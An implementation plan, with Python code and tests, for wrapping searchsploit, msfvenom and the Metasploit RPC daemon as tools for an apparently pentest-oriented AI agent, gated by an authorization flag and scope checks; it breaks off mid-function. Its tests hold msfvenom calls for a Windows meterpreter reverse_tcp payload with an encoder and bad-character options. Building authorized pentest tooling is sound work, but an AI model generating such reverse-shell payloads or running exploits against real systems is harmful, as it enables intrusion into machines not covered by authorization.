# Metasploit Bridge Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Wrap searchsploit, msfvenom, and the Metasploit RPC daemon into 8 MCP tools so the agent can close the "find a known public exploit, generate a payload, try it" loop.

**Architecture:** One new module `src/reverser/tools/metasploit.py` holds all 8 tools plus daemon lifecycle helpers (mirroring the bloodhound module pattern). A shared `msfrpcd` daemon runs at `127.0.0.1:55553` with per-target MSF workspaces; auth credentials live at `<targets_root>/.shared/msfrpc/auth.json` (mode 0600). A new `src/reverser/profiles/exploit.py` joins the manager profile's dispatch pool as specialty #6.

**Tech Stack:**
- Python 3.11+ (existing harness)
- `pymetasploit3` (new venv dep) — JSON-RPC client to msfrpcd
- `fcntl.flock` — concurrent-start serialization (Linux + macOS)
- `subprocess` — searchsploit / msfvenom / msfrpcd spawn
- Existing patterns: `@tool` decorator → `SdkMcpTool`, `kb.scope.assert_in_scope`, per-target SQLite KB, daemon pidfile lifecycle (see `src/reverser/tools/bloodhound.py`)

**Spec:** `docs/superpowers/specs/2026-05-11-metasploit-bridge-design.md` — references to "D1"…"D12" in this plan map to the spec's 12 architectural decisions.

**Branch / worktree:** `feature/metasploit-bridge` at `.worktrees/metasploit-bridge/` (already created, based on main 1c192e8).

**Test runner:** `/Users/jrizzo/Projects/gitea/johnrizzo1/reverser/.devenv/state/venv/bin/pytest`

**Baseline:** 438 passing tests, 69 registered tools (66 unique). Target after this plan: ~490 passing tests, 77 registered tools (74 unique).

---

## File structure

### Add

| Path | Responsibility |
|---|---|
| `src/reverser/tools/metasploit.py` | 8 MCP tools + lifecycle helpers. Single file per D2 — all three external tools (searchsploit / msfvenom / msfrpc) are one capability cluster. |
| `src/reverser/profiles/exploit.py` | Exploit profile with 6 skills. New dispatchable specialty (D4). |
| `tests/test_metasploit_helpers.py` | Pure helpers: paths, auth.json, pidfile, _process_alive, payload-path mangling, workspace name normalization, flock context manager. |
| `tests/test_metasploit_lifecycle.py` | start / stop / status with mocked `subprocess.Popen` and mocked `_wait_for_rpc_ready`. |
| `tests/test_metasploit_operations.py` | search / run / session with mocked `pymetasploit3.MsfRpcClient`. Verifies check-then-exploit decision matrix, scope check BEFORE check, auto-finding write. |
| `tests/test_searchsploit.py` | searchsploit CLI wrapper with mocked `subprocess.run`. |
| `tests/test_msfvenom.py` | Payload generation with mocked subprocess; verifies ArtifactFact write + path mangling. |
| `tests/test_profiles_exploit.py` | Profile registration assertions. |
| `tests/manual/exploit_smoke.md` | 30-min walkthrough against an HTB box; out-of-suite. |

### Modify

| Path | Change |
|---|---|
| `src/reverser/tools/__init__.py` | Register 8 new tools; `ALL_TOOLS` grows 69 → 77. |
| `src/reverser/tools/dispatch.py` | `_DISPATCHABLE_SPECIALTIES` += `"exploit"` (5 → 6). |
| `src/reverser/profiles/__init__.py` | Import `exploit` module for side-effect registration. |
| `src/reverser/profiles/manager.py` | Add `exploit` paragraph to specialist menu in `SYSTEM_ADDENDUM`. |
| `devenv.nix` | `+ metasploit-framework`, `+ exploitdb` (cross-platform packages); `+ pymetasploit3` (venv requirements). |
| `CAPABILITY_ROADMAP.md` | Mark Top 5 #1 ✅ shipped with status note. |
| `README.md` | exploit profile row in profiles table; brief usage section. |
| `tests/test_tool_registry.py` | `ALL_TOOLS == 77` assertion; new `test_metasploit_*_registered` assertions. |

### Does not change

- KB schema — `findings`, `artifacts`, `hypotheses`, `notes` already cover this (D3)
- Backends (`ClaudeBackend`, `OpenAICompatBackend`)
- TUI app structure
- `kb/scope.py` — existing `assert_in_scope` covers metasploit_run
- Manager profile allowlist (D5) — msf tools go through `dispatch_specialist`, not direct

---

## Phase plan (22 tasks)

| Phase | Tasks | Description |
|---|---|---|
| 1 | 1–3 | Module scaffold + searchsploit (no daemon) |
| 2 | 4–5 | msfvenom payload generator + KB artifact write |
| 3 | 6–9 | Daemon lifecycle helpers + `metasploit_start` |
| 4 | 10–12 | `metasploit_stop` / `metasploit_status` + lifecycle tool registration |
| 5 | 13–17 | `metasploit_search` / `metasploit_run` / `metasploit_session` + operations registration |
| 6 | 18–19 | Exploit profile + dispatch integration + manager blurb |
| 7 | 20–22 | devenv.nix + docs + smoke + final validation |

Recommended subagent-driven checkpoints: end of Phase 3 (Task 9, daemon spins up), end of Phase 5 (Task 17, all 8 tools wired), end of Phase 6 (Task 19, profile + dispatch integration complete).

---

## Task 1: Module scaffold + path/auth helpers

**Files:**
- Create: `src/reverser/tools/metasploit.py`
- Create: `tests/test_metasploit_helpers.py`

Set up the module with the constants, path helpers, and auth.json roundtrip. These are pure helpers — no subprocess, no daemon, just filesystem and crypto.

Implements D8 (auth file at `<targets_root>/.shared/msfrpc/auth.json` mode 0600) and the path foundation for later tasks.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_metasploit_helpers.py`:

```python
"""Tests for metasploit module pure helpers (no subprocess, no daemon)."""

import json
import os

import pytest

from reverser.tools.metasploit import (
    _msf_state_dir,
    _auth_path,
    _pidfile_path,
    _lock_path,
    _read_or_create_auth,
    DEFAULT_RPC_HOST,
    DEFAULT_RPC_PORT,
)


def test_msf_state_dir_under_shared(tmp_targets_dir):
    p = _msf_state_dir()
    assert p == tmp_targets_dir / ".shared" / "msfrpc"


def test_msf_state_dir_created_on_first_access(tmp_targets_dir):
    p = _msf_state_dir()
    assert p.is_dir()
    # 0700 perms (best-effort; checks at least owner-rwx)
    mode = p.stat().st_mode & 0o777
    assert mode & 0o700 == 0o700


def test_auth_path(tmp_targets_dir):
    assert _auth_path() == tmp_targets_dir / ".shared" / "msfrpc" / "auth.json"


def test_pidfile_path(tmp_targets_dir):
    assert _pidfile_path() == tmp_targets_dir / ".shared" / "msfrpc" / "pidfile"


def test_lock_path(tmp_targets_dir):
    assert _lock_path() == tmp_targets_dir / ".shared" / "msfrpc" / "auth.json.lock"


def test_read_or_create_auth_generates_when_missing(tmp_targets_dir):
    auth = _read_or_create_auth()
    assert auth["user"] == "msf"
    assert len(auth["password"]) >= 32
    assert auth["host"] == DEFAULT_RPC_HOST
    assert auth["port"] == DEFAULT_RPC_PORT
    assert auth["ssl"] is False


def test_read_or_create_auth_persists_to_disk_mode_0600(tmp_targets_dir):
    auth = _read_or_create_auth()
    path = _auth_path()
    assert path.is_file()
    mode = path.stat().st_mode & 0o777
    # 0600 — owner read/write only
    assert mode == 0o600
    on_disk = json.loads(path.read_text())
    assert on_disk == auth


def test_read_or_create_auth_roundtrips(tmp_targets_dir):
    first = _read_or_create_auth()
    second = _read_or_create_auth()
    assert first == second


def test_default_rpc_constants():
    assert DEFAULT_RPC_HOST == "127.0.0.1"
    assert DEFAULT_RPC_PORT == 55553
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: FAIL — `ModuleNotFoundError: No module named 'reverser.tools.metasploit'`

- [ ] **Step 3: Write the implementation**

Create `src/reverser/tools/metasploit.py`:

```python
"""Metasploit bridge tools: searchsploit, msfvenom, and msfrpcd RPC.

All 8 tools live in this file (per spec D2). Daemon lifecycle is shared:
one msfrpcd at 127.0.0.1:55553, per-target MSF workspaces.

See docs/superpowers/specs/2026-05-11-metasploit-bridge-design.md for the
full design including the 12 architectural decisions (D1-D12).
"""

from __future__ import annotations

import json
import os
import secrets
from contextlib import contextmanager
from pathlib import Path
from typing import Any


# ── Constants ───────────────────────────────────────────────────────

DEFAULT_RPC_HOST = "127.0.0.1"
DEFAULT_RPC_PORT = 55553
DEFAULT_RPC_USER = "msf"
_AUTH_PASSWORD_BYTES = 32   # secrets.token_urlsafe(32) → ~43 char string
_RPC_READY_TIMEOUT_DEFAULT = 60


# ── Path helpers ────────────────────────────────────────────────────

def _targets_root() -> Path:
    return Path(os.environ.get("REVERSER_TARGETS_DIR", "targets"))


def _msf_state_dir() -> Path:
    """Shared msfrpc state directory: <targets_root>/.shared/msfrpc/.

    Created on first access with mode 0700 (best-effort; some filesystems
    do not honor chmod).
    """
    p = _targets_root() / ".shared" / "msfrpc"
    p.mkdir(parents=True, exist_ok=True)
    try:
        os.chmod(p, 0o700)
    except OSError:
        pass
    return p


def _auth_path() -> Path:
    return _msf_state_dir() / "auth.json"


def _pidfile_path() -> Path:
    return _msf_state_dir() / "pidfile"


def _lock_path() -> Path:
    return _msf_state_dir() / "auth.json.lock"


# ── Auth file (D8: random password, 0600, persistent) ───────────────

def _read_or_create_auth() -> dict:
    """Return the shared auth dict.

    If auth.json exists, parse and return. Otherwise generate a random
    32-char password and write 0600. Persistent across reverser processes
    so already-running daemons can be authenticated.
    """
    path = _auth_path()
    if path.is_file():
        try:
            return json.loads(path.read_text())
        except json.JSONDecodeError:
            pass  # fall through and regenerate

    auth = {
        "user": DEFAULT_RPC_USER,
        "password": secrets.token_urlsafe(_AUTH_PASSWORD_BYTES),
        "host": DEFAULT_RPC_HOST,
        "port": DEFAULT_RPC_PORT,
        "ssl": False,
    }
    path.write_text(json.dumps(auth, indent=2))
    try:
        os.chmod(path, 0o600)
    except OSError:
        pass
    return auth


# ── Tools list (populated as tools are added in subsequent tasks) ──

TOOLS: list = []
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: PASS — 8 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_helpers.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): module scaffold + auth.json helpers"
```

---

## Task 2: searchsploit_search tool

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool + helper)
- Create: `tests/test_searchsploit.py`

The simplest of the three external tools. No daemon, just `searchsploit -j` subprocess + JSON parse. Optional KB note write when `target=` is given.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_searchsploit.py`:

```python
"""Tests for the searchsploit_search MCP tool."""

import json
import asyncio
from unittest.mock import patch, MagicMock

import pytest


def _call(tool_obj, args):
    fn = getattr(tool_obj, "handler", None) or getattr(tool_obj, "fn", None) or tool_obj
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(fn(args))
    finally:
        loop.close()


_FAKE_SEARCHSPLOIT_JSON = json.dumps({
    "SEARCH": "ProFTPD",
    "DB_PATH": "/usr/share/exploitdb",
    "RESULTS_EXPLOIT": [
        {
            "EDB-ID": "49908",
            "Title": "ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution",
            "Type": "remote",
            "Platform": "linux",
            "Date_Published": "2019-07-19",
            "Path": "linux/remote/49908.rb",
            "Codes": "CVE-2015-3306",
        },
        {
            "EDB-ID": "36742",
            "Title": "ProFTPd 1.3.5 - File Copy",
            "Type": "remote",
            "Platform": "linux",
            "Date_Published": "2015-04-07",
            "Path": "linux/remote/36742.txt",
            "Codes": "CVE-2015-3306",
        }
    ],
    "RESULTS_SHELLCODE": [],
})


def test_searchsploit_search_parses_results(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": _FAKE_SEARCHSPLOIT_JSON, "stderr": "",
                                 "returncode": 0}
        result = _call(searchsploit_search, {"query": "ProFTPD"})
    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "49908" in text
    assert "ProFTPd 1.3.5" in text
    assert "CVE-2015-3306" in text


def test_searchsploit_search_no_results(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    empty = json.dumps({"SEARCH": "nonexistent", "DB_PATH": "/usr/share/exploitdb",
                        "RESULTS_EXPLOIT": [], "RESULTS_SHELLCODE": []})
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": empty, "stderr": "", "returncode": 0}
        result = _call(searchsploit_search, {"query": "nonexistent"})
    text = result["content"][0]["text"]
    assert "no" in text.lower() or "0" in text


def test_searchsploit_search_with_target_writes_kb_note(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    from reverser.kb import for_target
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": _FAKE_SEARCHSPLOIT_JSON, "stderr": "",
                                 "returncode": 0}
        _call(searchsploit_search, {"query": "ProFTPD", "target": "10.10.10.5"})
    kb = for_target("10.10.10.5")
    notes = kb.get_notes()
    assert any("searchsploit" in n.lower() and "ProFTPD" in n for n in notes)


def test_searchsploit_search_without_target_no_kb_write(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    from reverser.kb import for_target
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": _FAKE_SEARCHSPLOIT_JSON, "stderr": "",
                                 "returncode": 0}
        _call(searchsploit_search, {"query": "ProFTPD"})
    # If we never asked KB about this target, the KB cache shouldn't have it.
    # Be defensive: even if it does, just check notes is empty.
    import reverser.kb
    if "10.10.10.5" in reverser.kb._kb_cache:
        kb = reverser.kb._kb_cache["10.10.10.5"]
        assert kb.get_notes() == []


def test_searchsploit_search_command_failure(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": "", "stderr": "searchsploit: not found",
                                 "returncode": 127}
        result = _call(searchsploit_search, {"query": "ProFTPD"})
    assert result.get("is_error") is True
    assert "searchsploit" in result["content"][0]["text"]


def test_searchsploit_search_limit_truncates(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import searchsploit_search
    many_results = {
        "SEARCH": "Linux", "DB_PATH": "/usr/share/exploitdb",
        "RESULTS_EXPLOIT": [
            {"EDB-ID": str(i), "Title": f"Result {i}", "Type": "local",
             "Platform": "linux", "Date_Published": "2020-01-01",
             "Path": f"linux/local/{i}.py", "Codes": ""}
            for i in range(100)
        ],
        "RESULTS_SHELLCODE": [],
    }
    with patch("reverser.tools.metasploit._run_searchsploit") as mock_run:
        mock_run.return_value = {"stdout": json.dumps(many_results), "stderr": "",
                                 "returncode": 0}
        result = _call(searchsploit_search, {"query": "Linux", "limit": 5})
    text = result["content"][0]["text"]
    # 5 lines of results plus header/summary; should mention 100 total
    assert "Result 0" in text
    assert "Result 4" in text
    assert "Result 5" not in text
    assert "100" in text  # mentions total


def test_searchsploit_requires_pentest_auth(tmp_targets_dir, monkeypatch):
    monkeypatch.delenv("REVERSER_PENTEST_AUTHORIZED", raising=False)
    monkeypatch.chdir(tmp_targets_dir)
    from reverser.tools.metasploit import searchsploit_search
    result = _call(searchsploit_search, {"query": "ProFTPD"})
    assert result.get("is_error") is True
    assert "authoriz" in result["content"][0]["text"].lower()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_searchsploit.py -v
```
Expected: FAIL — `ImportError: cannot import name 'searchsploit_search' from 'reverser.tools.metasploit'`

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
# ── searchsploit (exploit-db local search) ──────────────────────────

import subprocess

from claude_agent_sdk import tool

from ..kb import for_target, require_pentest_auth, AuthorizationError
from ._common import format_tool_result, format_error


def _run_searchsploit(query: str, *, cve_only: bool, title_only: bool) -> dict:
    """Invoke `searchsploit -j`. Pulled out for test mocking."""
    cmd = ["searchsploit", "-j"]
    if cve_only:
        cmd.append("--cve")
    if title_only:
        cmd.append("-t")
    cmd.append(query)
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return {
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "searchsploit timed out after 30s",
                "returncode": -1}
    except FileNotFoundError:
        return {"stdout": "", "stderr": "searchsploit not found in PATH "
                "(install via `exploitdb` package)", "returncode": 127}


def _parse_searchsploit_json(raw: str, *, limit: int) -> tuple[list[dict], int]:
    """Parse `searchsploit -j` output. Returns (candidates, total_count).

    total_count is the pre-truncation count; candidates is truncated to `limit`.
    Each candidate dict has: exploit_id, title, type, platform, date, path, cve.
    """
    try:
        data = json.loads(raw)
    except json.JSONDecodeError:
        return [], 0
    raw_results = data.get("RESULTS_EXPLOIT", []) or []
    total = len(raw_results)
    out = []
    for entry in raw_results[:limit]:
        out.append({
            "exploit_id": entry.get("EDB-ID", ""),
            "title": entry.get("Title", ""),
            "type": entry.get("Type", ""),
            "platform": entry.get("Platform", ""),
            "date": entry.get("Date_Published", ""),
            "path": entry.get("Path", ""),
            "cve": entry.get("Codes", "") or "",
        })
    return out, total


@tool(
    "searchsploit_search",
    "Search the local exploit-db (via searchsploit) for a CVE, keyword, or "
    "software name. Returns a ranked candidate list with EDB-IDs, titles, "
    "platforms, and paths. If `target` is given, records a KB note "
    "summarizing the candidates.",
    {
        "type": "object",
        "properties": {
            "query": {"type": "string",
                      "description": "CVE (e.g. 'CVE-2022-12345') or keyword "
                                     "(e.g. 'ProFTPD')"},
            "cve_only": {"type": "boolean", "default": False,
                         "description": "Only return CVE-tagged results (--cve)"},
            "title_only": {"type": "boolean", "default": True,
                           "description": "Match against title only (saner default; --title)"},
            "target": {"type": "string",
                       "description": "Optional target — when set, the candidate "
                                      "list is recorded as a KB note."},
            "limit": {"type": "integer", "default": 30,
                      "description": "Max candidates returned (default 30)"},
        },
        "required": ["query"],
    },
)
async def searchsploit_search(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    query = args["query"]
    cve_only = bool(args.get("cve_only", False))
    title_only = bool(args.get("title_only", True))
    target = args.get("target") or None
    limit = int(args.get("limit", 30))

    proc = _run_searchsploit(query, cve_only=cve_only, title_only=title_only)
    if proc["returncode"] != 0:
        return format_error(
            f"searchsploit failed (rc={proc['returncode']}): "
            f"{proc['stderr'][:500] or proc['stdout'][:500]}"
        )

    candidates, total = _parse_searchsploit_json(proc["stdout"], limit=limit)

    if not candidates:
        return format_tool_result(f"searchsploit: no results for {query!r}.")

    lines = [f"searchsploit results for {query!r} "
             f"(showing {len(candidates)} of {total}):", ""]
    for c in candidates:
        cve = f" [{c['cve']}]" if c["cve"] else ""
        lines.append(f"  EDB-{c['exploit_id']}{cve}")
        lines.append(f"    {c['title']}")
        lines.append(f"    {c['type']}/{c['platform']}  ({c['date']})")
        lines.append(f"    path: {c['path']}")
        lines.append("")

    summary = "\n".join(lines)

    if target:
        try:
            kb = for_target(target)
            note_lines = [
                f"searchsploit query: {query} "
                f"(cve_only={cve_only}, title_only={title_only})",
                f"  matches: {total} total, {len(candidates)} returned",
            ]
            for c in candidates[:10]:
                cve = f" [{c['cve']}]" if c["cve"] else ""
                note_lines.append(f"    EDB-{c['exploit_id']}{cve} — {c['title']}")
            kb.record_note("\n".join(note_lines))
        except Exception:
            pass  # best-effort KB write

    return format_tool_result(summary)


TOOLS.append(searchsploit_search)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_searchsploit.py -v
```
Expected: PASS — 7 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_searchsploit.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): searchsploit_search tool"
```

---

## Task 3: Register searchsploit in tool registry

**Files:**
- Modify: `src/reverser/tools/__init__.py`
- Modify: `tests/test_tool_registry.py`

Wire `metasploit.py` into the central registry. Only one tool added so far; `ALL_TOOLS` goes 69 → 70.

- [ ] **Step 1: Write the failing tests**

Modify `tests/test_tool_registry.py` — update the existing count assertion and add searchsploit:

Replace:
```python
    assert len(ALL_TOOLS) == 69, (
        f"expected 69 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 67, (
        f"expected 67 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

with:
```python
    assert len(ALL_TOOLS) == 70, (
        f"expected 70 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 68, (
        f"expected 68 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

Add a new test at the bottom of the file:

```python
def test_searchsploit_search_registered():
    names = {t.name for t in ALL_TOOLS}
    assert "searchsploit_search" in names
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: FAIL — count is still 69; `searchsploit_search` is not registered.

- [ ] **Step 3: Write the implementation**

Modify `src/reverser/tools/__init__.py`:

```python
"""RE tool registry — aggregates all tool categories into a single MCP server."""

from claude_agent_sdk import create_sdk_mcp_server

from .triage import TOOLS as triage_tools
from .static import TOOLS as static_tools
from .dynamic import TOOLS as dynamic_tools
from .python_analysis import TOOLS as python_tools
from .exploit import TOOLS as exploit_tools
from .util import TOOLS as util_tools
from .network import TOOLS as network_tools
from .web import TOOLS as web_tools
from .kb import TOOLS as kb_tools
from .netexec import TOOLS as netexec_tools
from .bloodhound import TOOLS as bloodhound_tools
from .dispatch import TOOLS as dispatch_tools
from .enum4linux_ng import TOOLS as enum4linux_ng_tools
from .metasploit import TOOLS as metasploit_tools

ALL_TOOLS = (
    triage_tools + static_tools + dynamic_tools + python_tools
    + exploit_tools + util_tools + network_tools + web_tools
    + kb_tools + netexec_tools + bloodhound_tools + dispatch_tools
    + enum4linux_ng_tools + metasploit_tools
)


def create_re_mcp_server():
    """Create the MCP server exposing all RE tools."""
    return create_sdk_mcp_server(
        name="re",
        version="0.1.0",
        tools=ALL_TOOLS,
    )
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS — count is now 70 and searchsploit_search is in the registry.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/__init__.py tests/test_tool_registry.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): register searchsploit_search (ALL_TOOLS 69→70)"
```

---

## Task 4: msfvenom_generate tool + payload-path helper

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool + helpers)
- Create: `tests/test_msfvenom.py`

msfvenom is also no-daemon. Generates a payload binary, writes it to `targets/<target>/loot/payloads/<name>-<sha8>.<ext>` (per D12), records an `ArtifactFact` in the KB.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_msfvenom.py`:

```python
"""Tests for msfvenom_generate MCP tool."""

import asyncio
import hashlib
from pathlib import Path
from unittest.mock import patch

import pytest


def _call(tool_obj, args):
    fn = getattr(tool_obj, "handler", None) or getattr(tool_obj, "fn", None) or tool_obj
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(fn(args))
    finally:
        loop.close()


def _fake_msfvenom_writes_payload(path: Path, content: bytes = b"\x90\x90PAYLOAD"):
    """Helper: simulate msfvenom writing the payload file."""
    def _side_effect(cmd, **kwargs):
        # locate -o <path> in cmd and write the content
        for i, arg in enumerate(cmd):
            if arg == "-o" and i + 1 < len(cmd):
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(content)
                break
        return {"stdout": "Payload size: 7 bytes\n", "stderr": "", "returncode": 0}
    return _side_effect


def test_msfvenom_writes_to_loot_payloads(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path())):
        result = _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    assert result.get("is_error") is not True
    payloads_dir = tmp_targets_dir / "10.10.10.5" / "loot" / "payloads"
    assert payloads_dir.is_dir()
    written = list(payloads_dir.glob("*.exe"))
    assert len(written) == 1


def test_msfvenom_filename_uses_sha8_and_extension(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    content = b"PAYLOAD-DATA-FIXED"
    expected_sha8 = hashlib.sha256(content).hexdigest()[:8]
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path(), content=content)):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    payloads_dir = tmp_targets_dir / "10.10.10.5" / "loot" / "payloads"
    written = list(payloads_dir.glob("*.exe"))
    assert len(written) == 1
    name = written[0].name
    assert expected_sha8 in name
    assert name.endswith(".exe")


def test_msfvenom_records_artifact_fact(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    from reverser.kb import for_target
    with patch("reverser.tools.metasploit._run_msfvenom",
               side_effect=_fake_msfvenom_writes_payload(Path())):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    kb = for_target("10.10.10.5")
    artifacts = kb.get_artifacts()
    assert len(artifacts) == 1
    art = artifacts[0]
    assert art.kind == "payload"
    assert art.source_tool == "msfvenom"
    assert art.sha256 is not None
    assert "/loot/payloads/" in art.path


def test_msfvenom_passes_encoder_and_iterations(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    captured = {}
    def capture(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        # write the file so the rest of the tool succeeds
        for i, a in enumerate(cmd):
            if a == "-o":
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(b"x")
        return {"stdout": "", "stderr": "", "returncode": 0}
    with patch("reverser.tools.metasploit._run_msfvenom", side_effect=capture):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
            "encoder": "x64/shikata_ga_nai", "iterations": 3,
        })
    cmd = captured["cmd"]
    assert "-e" in cmd
    assert "x64/shikata_ga_nai" in cmd
    assert "-i" in cmd
    assert "3" in cmd


def test_msfvenom_passes_bad_chars(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    captured = {}
    def capture(cmd, **kwargs):
        captured["cmd"] = list(cmd)
        for i, a in enumerate(cmd):
            if a == "-o":
                Path(cmd[i + 1]).parent.mkdir(parents=True, exist_ok=True)
                Path(cmd[i + 1]).write_bytes(b"x")
        return {"stdout": "", "stderr": "", "returncode": 0}
    with patch("reverser.tools.metasploit._run_msfvenom", side_effect=capture):
        _call(msfvenom_generate, {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
            "bad_chars": "\\x00\\x0a\\x0d",
        })
    cmd = captured["cmd"]
    assert "-b" in cmd
    assert "\\x00\\x0a\\x0d" in cmd


def test_msfvenom_msf_command_failure(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import msfvenom_generate
    with patch("reverser.tools.metasploit._run_msfvenom") as mock_run:
        mock_run.return_value = {"stdout": "", "stderr": "Invalid payload",
                                 "returncode": 1}
        result = _call(msfvenom_generate, {
            "payload": "bogus/payload",
            "lhost": "10.10.14.5", "lport": 4444,
            "format": "exe", "target": "10.10.10.5",
        })
    assert result.get("is_error") is True


def test_msfvenom_requires_pentest_auth(tmp_targets_dir, monkeypatch):
    monkeypatch.delenv("REVERSER_PENTEST_AUTHORIZED", raising=False)
    monkeypatch.chdir(tmp_targets_dir)
    from reverser.tools.metasploit import msfvenom_generate
    result = _call(msfvenom_generate, {
        "payload": "windows/x64/meterpreter/reverse_tcp",
        "lhost": "10.10.14.5", "lport": 4444,
        "format": "exe", "target": "10.10.10.5",
    })
    assert result.get("is_error") is True
    assert "authoriz" in result["content"][0]["text"].lower()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_msfvenom.py -v
```
Expected: FAIL — `ImportError: cannot import name 'msfvenom_generate'`

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
# ── msfvenom (payload generator) ────────────────────────────────────

import hashlib
import re as _re

from ..kb import ArtifactFact


_PAYLOAD_NAME_RE = _re.compile(r"[^a-zA-Z0-9_-]+")


def _mangle_payload_name(payload: str) -> str:
    """Turn 'windows/x64/meterpreter/reverse_tcp' into a filesystem-safe stem."""
    return _PAYLOAD_NAME_RE.sub("_", payload).strip("_")


def _payload_loot_dir(target: str) -> Path:
    """Per-target loot/payloads/ directory."""
